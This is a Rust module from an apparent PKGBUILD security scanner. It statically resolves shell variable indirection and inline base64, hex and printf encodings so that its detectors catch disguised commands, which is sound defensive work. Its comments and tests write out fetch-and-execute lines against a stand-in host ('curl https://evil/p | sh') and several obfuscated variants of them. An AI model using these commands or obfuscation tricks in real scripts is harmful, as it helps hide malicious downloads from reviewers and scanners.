//! Intra-PKGBUILD variable resolution (a lightweight, static taint pass).
//!
//! The detectors match shell text token-by-token, so a payload hidden behind a
//! shell variable evades every rule -- the rc1 SECURITY-AUDIT finding **HI-6**:
//! `x=curl; $x https://evil/p | sh` and `c=$(printf '\x63url'); $c …` "trip
//! nothing." There is no dataflow.
//!
//! This module closes that class by resolving **statically-evident** assignments
//! within a script and substituting the variable *uses* back to the value the
//! shell would expand, producing a normalized variant that every rule then sees.
//! It is the companion to the de-obfuscation pass ([`crate::textutil`]) and the
//! named prerequisite for the correlation engine: a re-spelled fetch/exec step
//! (`$x …| $y`) still maps to its capability.
//!
//! ## Safety / faithfulness (why this can't manufacture false positives)
//!
//! Like de-obfuscation, the resolved text is matched *in addition to* the raw
//! line, so resolution can only ever ADD a finding (close a false negative),
//! never suppress one. And it is **faithful**: a variable is resolved only to a
//! value the script itself assigned it from a static constant, so the resolved
//! line is exactly the command the shell would run -- no fabricated tokens.
//!
//! ## Conservatism (the FP discipline)
//!
//! * Nothing is ever executed. Command substitutions are resolved ONLY for the
//!   `$(printf …)`/`` `printf …` `` constant-format case, by decoding the format
//!   string -- never by running anything.
//! * Only variables assigned a static constant *in this text* enter the map; a
//!   variable we never saw assigned (e.g. makepkg's `$srcdir`/`$pkgver`) is left
//!   untouched, so ordinary build lines do not change.
//! * Known build variables (`pkgver`, `srcdir`, `CARGO_*`, …) are never tracked
//!   even when assigned, so legitimate packaging never gets rewritten.
//! * Resolution is single-pass and flow-ordered: a use resolves to the most
//!   recent prior assignment, matching shell evaluation order.

use std::collections::HashMap;
use std::sync::LazyLock;

use regex::Regex;

use crate::textutil::{
    logical_lines, normalize_shell_quoting, split_statements, split_words, BraceScanner,
};

/// Maximum length of a resolved value we will substitute. A bound against a
/// pathological accumulation (`v=$v$v…`) inflating a line; real command/URL
/// constants are short.
const MAX_VALUE_LEN: usize = 512;

/// Variable names we never resolve even if the script assigns them, because they
/// are makepkg/build-system controlled and resolving them only risks rewriting
/// legitimate packaging lines (`cd "$srcdir/$pkgname-$pkgver"`). Matched
/// case-sensitively; the `CARGO_`/`CFLAGS`-style env vars are handled by
/// [`is_build_var`] via a prefix/upper-case rule.
const BUILD_VARS: &[&str] = &[
    "pkgname",
    "pkgbase",
    "pkgver",
    "pkgrel",
    "epoch",
    "pkgdir",
    "srcdir",
    "startdir",
    "builddir",
    "CARCH",
    "CHOST",
    "MAKEFLAGS",
    "DESTDIR",
    "GOPATH",
    "HOME",
    "PATH",
    "PREFIX",
    "srcdir",
];

/// True for a variable name we must not resolve: a known build var, or an
/// ALL-CAPS env-style name (`CARGO_*`, `CFLAGS`, `LDFLAGS`, `RUSTFLAGS`, …).
/// Upper-case names are overwhelmingly build/env configuration, not the
/// short lowercase aliases (`x`, `c`, `cmd`) malware uses to indirect a command.
fn is_build_var(name: &str) -> bool {
    if BUILD_VARS.contains(&name) {
        return true;
    }
    // ALL-CAPS (with digits/underscores) -> env/build configuration. Requires at
    // least one letter so a numeric token isn't misclassified.
    name.chars().any(|c| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

/// An assignment at command position: optional leading whitespace / `;` / `&&` /
/// `||` / `(` then `NAME=` then the rest of the (logical) line as the RHS. We
/// deliberately accept only a *leading* assignment (not one buried mid-command,
/// which bash treats as a per-command environment, e.g. `FOO=bar cmd`) by
/// anchoring at the start; `export`/`local`/`declare`/`readonly` prefixes are
/// stripped by [`strip_decl_prefix`] before matching.
static ASSIGN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$").unwrap());

/// A `$(printf 'FMT' …)` or `` `printf 'FMT'` `` command substitution whose
/// format is a single-quoted (or unquoted) constant. Captures the format string.
/// Only `printf` is resolved -- it produces output purely from its constant
/// arguments, so decoding it executes nothing.
static PRINTF_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^\$\(\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\)$|^`\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*`$"#)
        .unwrap()
});

/// Strip a leading `export`/`local`/`declare`/`readonly`/`typeset` keyword (and
/// any `-x`-style flags) so `export x=curl` is seen as the assignment `x=curl`.
fn strip_decl_prefix(line: &str) -> &str {
    let mut s = line.trim_start();
    loop {
        let mut advanced = false;
        for kw in ["export", "local", "declare", "readonly", "typeset"] {
            if let Some(rest) = s.strip_prefix(kw) {
                if let Some(after) = rest.strip_prefix(char::is_whitespace) {
                    s = after.trim_start();
                    advanced = true;
                    // skip leading -flags (declare -x, local -r, …)
                    while let Some(flag_rest) = s.strip_prefix('-') {
                        let end = flag_rest
                            .find(char::is_whitespace)
                            .map(|i| i + 1)
                            .unwrap_or(flag_rest.len());
                        s = flag_rest[end..].trim_start();
                        let _ = flag_rest;
                    }
                    break;
                }
            }
        }
        if !advanced {
            break;
        }
    }
    s
}

/// Decode a `printf` constant format string the way `printf` would expand its
/// backslash escapes: `\xHH` (hex), `\NNN`/`\0NNN` (octal), and the common C
/// controls. Returns the decoded bytes as a string. `%`-directives are left
/// as-is (no arguments are consumed/evaluated). This executes nothing -- it is a
/// pure constant fold of `printf '\x63url'` -> `curl`.
fn decode_printf_format(fmt: &str) -> String {
    let chars: Vec<char> = fmt.chars().collect();
    let mut out = String::with_capacity(fmt.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() {
            match chars[i + 1] {
                'x' => {
                    let hex: String = chars[i + 2..]
                        .iter()
                        .take(2)
                        .take_while(|c| c.is_ascii_hexdigit())
                        .collect();
                    if hex.is_empty() {
                        out.push('x');
                        i += 2;
                    } else {
                        if let Some(ch) =
                            u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32)
                        {
                            out.push(ch);
                        }
                        i += 2 + hex.len();
                    }
                }
                '0'..='7' => {
                    let oct: String = chars[i + 1..]
                        .iter()
                        .take(3)
                        .take_while(|c| c.is_digit(8))
                        .collect();
                    if let Some(ch) = u32::from_str_radix(&oct, 8).ok().and_then(char::from_u32) {
                        out.push(ch);
                    }
                    i += 1 + oct.len();
                }
                'n' => {
                    out.push('\n');
                    i += 2;
                }
                't' => {
                    out.push('\t');
                    i += 2;
                }
                'r' => {
                    out.push('\r');
                    i += 2;
                }
                '\\' => {
                    out.push('\\');
                    i += 2;
                }
                other => {
                    out.push(other);
                    i += 2;
                }
            }
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Resolve an assignment's right-hand side to a static constant value, or `None`
/// if it is not statically evident (references an unknown command-substitution, a
/// still-unresolved variable, etc.). `vars` is the map of already-resolved
/// variables so chained constant assignments (`a=cur; b=${a}l`) resolve.
fn resolve_rhs(rhs: &str, vars: &HashMap<String, String>) -> Option<String> {
    let rhs = rhs.trim();
    if rhs.is_empty() {
        return Some(String::new());
    }
    // A printf command-substitution constant: decode its format, execute nothing.
    if let Some(caps) = PRINTF_SUBST_RE.captures(rhs) {
        let fmt = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
        let decoded = decode_printf_format(fmt);
        return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
    }
    // Any other command substitution / backtick is not statically resolvable.
    if rhs.contains("$(") || rhs.contains('`') {
        return None;
    }
    // Substitute any already-known variables, then strip the quoting the shell
    // would (so `"cu""rl"`, `$'\x63'url`, `'curl'` all fold to the literal word).
    let substituted = substitute_vars(rhs, vars);
    // If a `$`-expansion of an UNKNOWN variable remains, the value is not fully
    // static -- refuse rather than emit a half-resolved token.
    let normalized = normalize_shell_quoting(&substituted);
    if normalized.contains('$') {
        return None;
    }
    (normalized.len() <= MAX_VALUE_LEN).then_some(normalized)
}

/// Matches a variable use: `$name`, `${name}`, `${!name}` (indirect),
/// `${name[@]}` / `${name[*]}` (whole array) and `${name[0]}`. The captured name
/// is a full identifier so `$vx` is not a use of `$v`.
static USE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\$\{!([A-Za-z_][A-Za-z0-9_]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\[[@*]\]\}|\$\{([A-Za-z_][A-Za-z0-9_]*)(?:\[0\])?\}|\$([A-Za-z_][A-Za-z0-9_]*)",
    )
    .unwrap()
});

/// Replace every resolvable `$v` / `${v}` / `${!v}` / `${v[@]}` in `line` with
/// its value from `vars`. Unknown variables are left verbatim. `${!v}` is one
/// extra hop: the value of `v` is itself treated as a variable name and resolved
/// again.
fn substitute_vars(line: &str, vars: &HashMap<String, String>) -> String {
    USE_RE
        .replace_all(line, |caps: &regex::Captures| {
            if let Some(ind) = caps.get(1) {
                // ${!name}: resolve name -> inner var name -> its value.
                return vars
                    .get(ind.as_str())
                    .and_then(|inner| vars.get(inner))
                    .cloned()
                    .unwrap_or_else(|| caps[0].to_string());
            }
            if let Some(arr) = caps.get(2) {
                return vars
                    .get(&format!("{}[@]", arr.as_str()))
                    .cloned()
                    .unwrap_or_else(|| caps[0].to_string());
            }
            let name = caps.get(3).or_else(|| caps.get(4)).unwrap().as_str();
            vars.get(name)
                .cloned()
                .unwrap_or_else(|| caps[0].to_string())
        })
        .into_owned()
}

/// `${IFS}` / `$IFS` / `${IFS%?}` / `$IFS$9` used as a word separator: the shell
/// expands every one of these to whitespace, so for matching they are a space.
static IFS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{IFS[^}]*\}(?:\$\d|\$\{\d\})?|\$IFS(?:\$\d|\$\{\d\})?").unwrap()
});

/// Leading control words that can precede an assignment statement
/// (`then c=curl`, `{ c=curl`, `do x=1`).
static CTRL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^(?:then|do|else|\{|\(|!)\s+").unwrap());

static FN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:function\s+)?[A-Za-z_][A-Za-z0-9_:-]*\s*\(\s*\)\s*\{?|^\s*function\s+[A-Za-z_][A-Za-z0-9_:-]*\s*\{?")
        .unwrap()
});

/// Upper bound on the size of an inline-encoded literal we will decode, and on
/// the decoded text we will splice back into a line.
const MAX_ENCODED_LEN: usize = 4096;
const MAX_DECODED_LEN: usize = 2048;

static B64_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(?:echo|printf)(?:\s+-[A-Za-z]+)*\s+(?:'%s'\s+|"%s"\s+|%s\s+)?['"]?([A-Za-z0-9+/]{8,4096}={0,2})['"]?\s*\|\s*(?:openssl\s+(?:enc\s+)?)?base64\s+(?:-[a-z]*d[a-z]*|--decode)\b"#,
    )
    .unwrap()
});
static B64_HERE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)base64\s+(?:-[a-z]*d[a-z]*|--decode)\s*<<<\s*['"]?([A-Za-z0-9+/]{8,4096}={0,2})['"]?"#,
    )
    .unwrap()
});
static HEX_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(?:echo|printf)(?:\s+-[A-Za-z]+)*\s+['"]?([0-9a-f]{8,4096})['"]?\s*\|\s*xxd\s+-r\s*-?p(?:s)?\b"#,
    )
    .unwrap()
});
static PRINTF_ESC_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"printf\s+(?:-\S+\s+)*'((?:[^'\\]|\\.){4,4096})'\s*\|"#).unwrap()
});
static ESC_COUNT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\x[0-9A-Fa-f]{2}|\\[0-7]{3}").unwrap());

/// Accept decoded bytes only when they are short, valid UTF-8 and overwhelmingly
/// printable (a decoded binary blob is not a command line). Newlines become
/// `; ` so the spliced text stays on one logical line (line numbers are kept).
fn accept_decoded(bytes: Vec<u8>) -> Option<String> {
    let text = String::from_utf8(bytes).ok()?;
    let total = text.chars().count();
    if total == 0 || text.len() > MAX_DECODED_LEN {
        return None;
    }
    let bad = text
        .chars()
        .filter(|c| !(c.is_whitespace() || (' '..='~').contains(c)))
        .count();
    if bad * 10 > total {
        return None;
    }
    Some(text.trim().replace('\r', "").replace('\n', "; "))
}

fn decode_b64(lit: &str) -> Option<String> {
    use base64::engine::general_purpose::{GeneralPurpose, GeneralPurposeConfig};
    use base64::engine::DecodePaddingMode;
    use base64::Engine;
    if lit.len() > MAX_ENCODED_LEN {
        return None;
    }
    let engine = GeneralPurpose::new(
        &base64::alphabet::STANDARD,
        GeneralPurposeConfig::new().with_decode_padding_mode(DecodePaddingMode::Indifferent),
    );
    accept_decoded(engine.decode(lit).ok()?)
}

fn decode_hex(lit: &str) -> Option<String> {
    if lit.len() > MAX_ENCODED_LEN || !lit.len().is_multiple_of(2) {
        return None;
    }
    let bytes: Option<Vec<u8>> = (0..lit.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&lit[i..i + 2], 16).ok())
        .collect();
    accept_decoded(bytes?)
}

/// Splice short inline-encoded payloads back as the text they decode to:
/// `echo <b64> | base64 -d`, `base64 -d <<< <b64>`, `echo <hex> | xxd -r -p` and
/// `printf '\x63\x75…' |` become their decoded command text, so every rule sees
/// the specific command the encoding hides (a decoded `curl … | sh` trips the
/// download-and-execute rules, not just the generic decode->execute heuristic).
/// Purely static, size-bounded, and run at most two levels deep. Returns `None`
/// when nothing decoded.
fn decode_inline_payloads(line: &str) -> Option<String> {
    let mut cur = line.to_string();
    let mut changed = false;
    for _ in 0..2 {
        let mut round = false;
        for (re, hex) in [
            (&*B64_PIPE_RE, false),
            (&*B64_HERE_RE, false),
            (&*HEX_PIPE_RE, true),
        ] {
            let next = re
                .replace_all(&cur, |c: &regex::Captures| {
                    let dec = if hex {
                        decode_hex(&c[1])
                    } else {
                        decode_b64(&c[1])
                    };
                    dec.unwrap_or_else(|| c[0].to_string())
                })
                .into_owned();
            if next != cur {
                cur = next;
                round = true;
            }
        }
        let next = PRINTF_ESC_PIPE_RE
            .replace_all(&cur, |c: &regex::Captures| {
                if ESC_COUNT_RE.find_iter(&c[1]).count() < 4 {
                    return c[0].to_string();
                }
                match accept_decoded(decode_printf_format(&c[1]).into_bytes()) {
                    Some(d) => format!("{d} |"),
                    None => c[0].to_string(),
                }
            })
            .into_owned();
        if next != cur {
            cur = next;
            round = true;
        }
        if !round {
            break;
        }
        changed = true;
    }
    changed.then_some(cur)
}

/// Drop a leading declaration keyword / control word / function header so the
/// assignment (if any) is at the front of the statement. Returns the remainder
/// and whether a declaration keyword (`local`/`declare`/…) was present.
pub(crate) fn statement_head(stmt: &str) -> (&str, bool) {
    let mut s = stmt.trim_start();
    loop {
        if let Some(m) = CTRL_RE.find(s) {
            s = s[m.end()..].trim_start();
        } else if let Some(m) = FN_RE.find(s) {
            if m.end() == 0 {
                break;
            }
            s = s[m.end()..].trim_start();
        } else {
            break;
        }
    }
    let stripped = strip_decl_prefix(s);
    (stripped, stripped.len() != s.len())
}

struct Scope {
    /// Effective variables at this point (globals overlaid by function locals).
    vars: HashMap<String, String>,
    /// Top-level (global) variables only.
    globals: HashMap<String, String>,
    in_func: bool,
}

impl Scope {
    fn set(&mut self, name: &str, val: String) {
        if !self.in_func {
            self.globals.insert(name.to_string(), val.clone());
        }
        self.vars.insert(name.to_string(), val);
    }

    fn forget(&mut self, name: &str) {
        for k in [name.to_string(), format!("{name}[@]")] {
            if !self.in_func {
                self.globals.remove(&k);
            }
            self.vars.remove(&k);
        }
    }

    /// Record one `name=value` assignment (value still raw shell text).
    fn assign(&mut self, name: &str, rhs: &str) {
        if is_build_var(name) {
            return;
        }
        let rhs = rhs.trim();
        if let Some(inner) = rhs.strip_prefix('(') {
            // Array assignment: `cmd=(curl -s URL)`. Track the first element as
            // `$cmd` and the whole list as `${cmd[@]}`.
            let Some(inner) = inner.strip_suffix(')') else {
                self.forget(name);
                return;
            };
            let elems: Option<Vec<String>> = split_words(inner)
                .iter()
                .map(|w| resolve_rhs(w, &self.vars))
                .collect();
            match elems {
                Some(e) => {
                    let joined = e.join(" ");
                    if joined.len() > MAX_VALUE_LEN {
                        self.forget(name);
                        return;
                    }
                    self.set(name, e.first().cloned().unwrap_or_default());
                    self.set(&format!("{name}[@]"), joined);
                }
                None => self.forget(name),
            }
            return;
        }
        match resolve_rhs(rhs, &self.vars) {
            Some(v) => self.set(name, v),
            // Unresolvable RHS: forget any stale value so a later use is not
            // resolved to an outdated constant (fail toward raw).
            None => self.forget(name),
        }
    }

    /// Track the assignments in one statement (`a=1`, `local a=1 b=2`,
    /// `export x=curl`). `VAR=x cmd args` is a per-command environment, not an
    /// assignment, and is ignored.
    fn track(&mut self, stmt: &str) {
        let (head, had_decl) = statement_head(stmt);
        let words = split_words(head);
        let mut assigns: Vec<(String, String)> = Vec::new();
        let mut idx = 0;
        while idx < words.len() {
            match ASSIGN_RE.captures(&words[idx]) {
                Some(c) => assigns.push((c[1].to_string(), c[2].to_string())),
                None => break,
            }
            idx += 1;
        }
        let rest = &words[idx..];
        if had_decl {
            // `local x` (no value) shadows any outer value.
            for w in rest {
                if w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') && !w.is_empty() {
                    self.forget(w);
                }
            }
        } else if !rest.is_empty() || assigns.is_empty() {
            return;
        }
        for (name, rhs) in assigns {
            self.assign(&name, &rhs);
        }
    }
}

/// One flow-ordered pass. `func_globals`, when given, is the end-of-file set of
/// top-level variables: makepkg sources the WHOLE PKGBUILD before it runs any
/// function, so a function body sees every top-level assignment regardless of
/// where in the file it sits relative to the function.
fn resolve_pass(
    logical: &[(usize, String)],
    func_globals: Option<&HashMap<String, String>>,
) -> (HashMap<usize, String>, HashMap<String, String>) {
    let mut scope = Scope {
        vars: HashMap::new(),
        globals: HashMap::new(),
        in_func: false,
    };
    let mut resolved_at: HashMap<usize, String> = HashMap::new();
    let mut scanner = BraceScanner::default();

    for (start_line, logical_line) in logical {
        // A function header starts a fresh local scope seeded with the globals,
        // so an assignment in one function never bleeds into another.
        if !scope.in_func && FN_RE.is_match(logical_line) {
            scope.in_func = true;
            scope.vars = func_globals.unwrap_or(&scope.globals).clone();
            scanner = BraceScanner::default();
        }

        let mut emitted = String::with_capacity(logical_line.len());
        for (stmt, sep) in split_statements(logical_line) {
            emitted.push_str(&substitute_vars(&stmt, &scope.vars));
            emitted.push_str(&sep);
            scope.track(&stmt);
        }

        // Variants that are not variable uses: `${IFS}` word separators and
        // short inline-encoded payloads.
        let emitted_ifs = IFS_RE.replace_all(&emitted, " ").into_owned();
        let emitted = decode_inline_payloads(&emitted_ifs).unwrap_or(emitted_ifs);
        if emitted != *logical_line {
            // Quote-normalize like the de-obfuscation pass, so a resolved
            // `"$c" url | "$s"` reads as `curl url | sh`.
            let normalized = normalize_shell_quoting(&emitted);
            resolved_at.insert(
                *start_line,
                if normalized.is_empty() {
                    emitted
                } else {
                    normalized
                },
            );
        }

        if scope.in_func {
            scanner.feed(logical_line);
            if scanner.peak > 0 && scanner.depth <= 0 {
                scope.in_func = false;
                scope.vars = scope.globals.clone();
            }
        }
    }
    (resolved_at, scope.globals)
}

/// Resolve statically-evident variable indirection in `content`, returning a
/// line-count-preserving text (so analyzers that report a line number still
/// point at the right physical line). The result is matched *in addition to* the
/// raw content by the detection pipeline.
///
/// Scoping follows makepkg: top-level assignments are global and visible inside
/// every function (the whole file is sourced before any function runs), while an
/// assignment inside a function stays local to it. Several assignments or
/// commands on one line (`c=curl; s=sh; $c url | $s`) are processed in order,
/// and `local a=1 b=2`, `cmd=(curl -s URL)` / `"${cmd[@]}"` and `${IFS}`
/// separators are understood. Short inline base64/hex payloads are spliced back
/// as the command text they decode to (see [`decode_inline_payloads`]).
///
/// Continuation lines are spliced (via [`logical_lines`]) so an assignment or use
/// split across a `\`-newline is still resolved; the resolved logical line is
/// emitted on its starting physical line and any continuation physical lines are
/// emitted blank to preserve the total line count.
pub fn resolve_variables(content: &str) -> String {
    let total_lines = content.lines().count();
    let logical = logical_lines(content);
    // Pass 1 collects the end-of-file globals; pass 2 emits with them visible
    // inside function bodies.
    let (_, final_globals) = resolve_pass(&logical, None);
    let (resolved_at, _) = resolve_pass(&logical, Some(&final_globals));

    // Re-emit physical lines, substituting the resolved logical variant on its
    // start line and blanking the spliced continuation lines.
    let continuation_lines = continuation_line_set(&logical, content);
    let mut out: Vec<String> = Vec::with_capacity(total_lines);
    for (idx, phys) in content.lines().enumerate() {
        let lineno = idx + 1;
        if let Some(resolved) = resolved_at.get(&lineno) {
            out.push(resolved.clone());
        } else if continuation_lines.contains(&lineno) {
            // This physical line was spliced into a logical line emitted above;
            // blank it to keep the 1:1 line count without duplicating content.
            out.push(String::new());
        } else {
            out.push(phys.to_string());
        }
    }
    out.join("\n")
}

/// Resolved text of function `name` (variables substituted, inline-encoded
/// payloads decoded) followed by the resolved text of every top-level helper
/// function it calls, transitively (depth-bounded, cycle-safe). Lets a check that
/// is scoped to `build()`/`package()` also see a payload that lives in a helper
/// defined at the top level and merely CALLED from there.
pub fn resolved_function_text(content: &str, name: &str) -> String {
    let resolved_full = resolve_variables(content);
    let phys: Vec<&str> = resolved_full.lines().collect();
    let spans = function_spans(content);
    let mut out = String::new();
    let mut seen: Vec<String> = Vec::new();
    let mut queue: Vec<(String, usize)> = vec![(name.to_string(), 0)];
    while let Some((fname, depth)) = queue.pop() {
        if seen.contains(&fname) {
            continue;
        }
        seen.push(fname.clone());
        let Some(&(s, e)) = spans.get(&fname) else {
            continue;
        };
        let body = phys
            .get(s.saturating_sub(1)..e.min(phys.len()))
            .unwrap_or(&[])
            .join("\n");
        out.push_str(&body);
        out.push('\n');
        if depth >= 3 {
            continue;
        }
        for other in spans.keys() {
            if !seen.contains(other) && calls_function(&body, other) {
                queue.push((other.clone(), depth + 1));
            }
        }
    }
    out
}

/// Whether `body` invokes `fname` as a command (word-bounded, not `fname-x`).
fn calls_function(body: &str, fname: &str) -> bool {
    let re = format!(
        r"(?:^|[\s;&|(`{{])(?:{})(?:\s|;|&|\||\)|`|$)",
        regex::escape(fname)
    );
    Regex::new(&re).is_ok_and(|r| r.is_match(body))
}

/// `name -> (first physical line, last physical line)` (1-based, inclusive) for
/// each function definition in `content`.
fn function_spans(content: &str) -> HashMap<String, (usize, usize)> {
    static NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^\s*(?:function\s+)?([A-Za-z_][A-Za-z0-9_:-]*)\s*(?:\(\s*\))?\s*\{?").unwrap()
    });
    let mut spans = HashMap::new();
    let mut cur: Option<(String, usize, BraceScanner)> = None;
    let total = content.lines().count();
    let logical = logical_lines(content);
    for (i, (phys, line)) in logical.iter().enumerate() {
        if cur.is_none() && FN_RE.is_match(line) {
            if let Some(c) = NAME_RE.captures(line) {
                cur = Some((c[1].to_string(), *phys, BraceScanner::default()));
            }
        }
        if let Some((name, start, sc)) = cur.as_mut() {
            sc.feed(line);
            if sc.peak > 0 && sc.depth <= 0 {
                let end = logical.get(i + 1).map_or(total, |(p, _)| p - 1).max(*phys);
                spans.insert(name.clone(), (*start, end));
                cur = None;
            }
        }
    }
    spans
}

/// The set of physical line numbers that are *continuation* lines (the 2nd+
/// physical line of a multi-physical-line logical line). Used to blank them in
/// the resolved output so the line count is preserved exactly once.
fn continuation_line_set(
    logical: &[(usize, String)],
    content: &str,
) -> std::collections::HashSet<usize> {
    // Recompute physical spans: a logical line starting at `start` spans until
    // the next logical line's start. The start lines are the non-continuation
    // lines; everything else is a continuation.
    let total = content.lines().count();
    let starts: std::collections::HashSet<usize> = logical.iter().map(|(s, _)| *s).collect();
    (1..=total).filter(|n| !starts.contains(n)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resolve(s: &str) -> String {
        resolve_variables(s)
    }

    // --- HI-6 the documented bypass: command-name indirection -----------------

    #[test]
    fn resolves_simple_command_alias() {
        // x=curl; $x https://evil/p | sh  -> the resolved variant exposes curl|sh
        let out = resolve("x=curl\n$x https://evil/p | sh");
        assert!(out.contains("curl https://evil/p | sh"), "got: {out}");
    }

    #[test]
    fn resolves_brace_and_indirect_forms() {
        let out = resolve("c=wget\n${c} https://evil/p -O- | bash");
        assert!(out.contains("wget https://evil/p -O- | bash"), "got: {out}");
    }

    #[test]
    fn resolves_printf_hex_command_substitution() {
        // c=$(printf '\x63url'); $c https://evil | sh
        let out = resolve(
            r"c=$(printf '\x63url')\n$c https://evil | sh"
                .replace("\\n", "\n")
                .as_str(),
        );
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_quote_split_assignment() {
        // c="cu""rl"; $c https://evil | sh   (the assignment itself is obfuscated)
        let out = resolve("c=\"cu\"\"rl\"\n$c https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_indirect_expansion() {
        // a=curl; b=a; ${!b} https://evil | sh   (${!b} == $curl-name == curl)
        let out = resolve("a=curl\nb=a\n${!b} https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_chained_constants() {
        let out = resolve("a=cur\nb=${a}l\n$b https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_eval_of_variable() {
        let out = resolve("p=\"curl https://evil | sh\"\neval $p");
        assert!(out.contains("eval curl https://evil | sh"), "got: {out}");
    }

    // --- conservatism / no-FP ------------------------------------------------

    #[test]
    fn does_not_resolve_build_vars() {
        // $srcdir / $pkgver are makepkg-controlled and never tracked, so a normal
        // build line is unchanged (no spurious resolution).
        let input = "cd \"$srcdir/$pkgname-$pkgver\"\nmake DESTDIR=\"$pkgdir\" install";
        let out = resolve(input);
        assert_eq!(out, input, "build vars must pass through unchanged");
    }

    #[test]
    fn does_not_resolve_uppercase_env_assignment() {
        // Even an in-body ALL-CAPS assignment is treated as build/env config and
        // not resolved into later uses.
        let input = "CARGO_HOME=/tmp/cargo\ncargo build --offline\necho $CARGO_HOME";
        let out = resolve(input);
        assert!(
            out.contains("echo $CARGO_HOME"),
            "uppercase env var must stay raw: {out}"
        );
    }

    #[test]
    fn unknown_variable_is_left_verbatim() {
        let input = "$undefined https://x | sh";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn unresolvable_command_substitution_is_not_tracked() {
        // v=$(date) is dynamic -> v must not be resolved (no fabricated value).
        let input = "v=$(date)\n$v";
        let out = resolve(input);
        assert!(
            out.contains("$v"),
            "dynamic assignment must not resolve: {out}"
        );
    }

    #[test]
    fn reassignment_to_dynamic_forgets_constant() {
        // a=curl then a=$(date): the later use must NOT resolve to the stale curl.
        let input = "a=curl\na=$(date)\n$a https://evil | sh";
        let out = resolve(input);
        assert!(
            !out.contains("curl https://evil"),
            "stale constant must be forgotten: {out}"
        );
    }

    #[test]
    fn line_count_is_preserved() {
        let input = "x=curl\n$x https://evil | sh\nmake";
        assert_eq!(resolve(input).lines().count(), input.lines().count());
    }

    #[test]
    fn plain_script_is_unchanged() {
        let input = "build() {\n  make\n  make install\n}";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn function_scope_resets_between_functions() {
        // x=echo in build() must not resolve $x in package().
        let input = "build() {\n  x=curl\n}\npackage() {\n  $x https://evil | sh\n}";
        let out = resolve(input);
        assert!(
            out.contains("$x https://evil"),
            "cross-function var must not leak: {out}"
        );
    }

    #[test]
    fn export_prefix_assignment_resolves() {
        let out = resolve("export x=curl\n$x https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn printf_format_decoder_basics() {
        assert_eq!(decode_printf_format(r"\x63url"), "curl");
        assert_eq!(decode_printf_format(r"\x77get"), "wget");
        assert_eq!(decode_printf_format(r"plain"), "plain");
    }

    #[test]
    fn resolves_several_assignments_on_one_line() {
        let out = resolve("c=curl; s=sh; $c https://evil | $s");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("a=cur && b=${a}l && $b https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_multi_assignment_declarations() {
        let out = resolve("f() {\n  local c=curl s=sh\n  $c https://evil | $s\n}");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("declare -x c=curl s=sh\n$c https://evil | $s");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn env_prefix_is_not_an_assignment() {
        // `x=1 make` sets x only for that command; it must not define `$x`.
        let input = "x=1 make\necho $x";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn top_level_assignments_reach_functions_but_locals_do_not_leak() {
        let out = resolve("_c=curl\nbuild() {\n  l=sh\n  $_c https://evil | $l\n}\npackage() {\n  $_c https://evil | $l\n}");
        let lines: Vec<&str> = out.lines().collect();
        assert!(lines[3].contains("curl https://evil | sh"), "got: {out}");
        assert!(lines[6].contains("curl https://evil | $l"), "got: {out}");
    }

    #[test]
    fn top_level_assignment_after_the_function_still_applies() {
        // makepkg sources the whole file before running any function.
        let out = resolve("package() {\n  $_c https://evil | sh\n}\n_c=curl");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn array_assignment_resolves_whole_array_use() {
        let out = resolve("cmd=(curl -s https://evil); \"${cmd[@]}\" | sh");
        assert!(out.contains("curl -s https://evil | sh"), "got: {out}");
    }

    #[test]
    fn ifs_separators_become_spaces() {
        let out = resolve("curl${IFS}-s${IFS}https://evil|sh");
        assert!(out.contains("curl -s https://evil|sh"), "got: {out}");
        let out = resolve("curl$IFS$9-s https://evil|sh");
        assert!(out.contains("curl -s https://evil|sh"), "got: {out}");
    }

    #[test]
    fn inline_base64_and_hex_payloads_are_spliced_back() {
